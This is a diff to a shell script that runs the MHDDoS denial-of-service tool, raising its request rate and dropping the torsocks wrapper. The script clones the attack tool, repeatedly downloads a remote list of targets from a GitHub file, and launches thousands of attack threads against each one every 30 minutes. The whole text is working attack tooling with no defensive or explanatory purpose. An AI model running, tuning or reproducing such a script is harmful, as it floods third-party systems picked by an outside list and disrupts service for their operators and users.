@@ -16,7 +16,7 @@ cd mhddos_proxy
 git clone https://github.com/MHProDev/MHDDoS.git
 
 threads="${1:-3000}"; threads="-t $threads"
-rpc="--rpc 2000"
+rpc="--rpc 3000"
 proxy_upd="-p 3600"
 debug="--debug"
 
@@ -34,7 +34,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            torsocks python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
 sleep 30m
 done
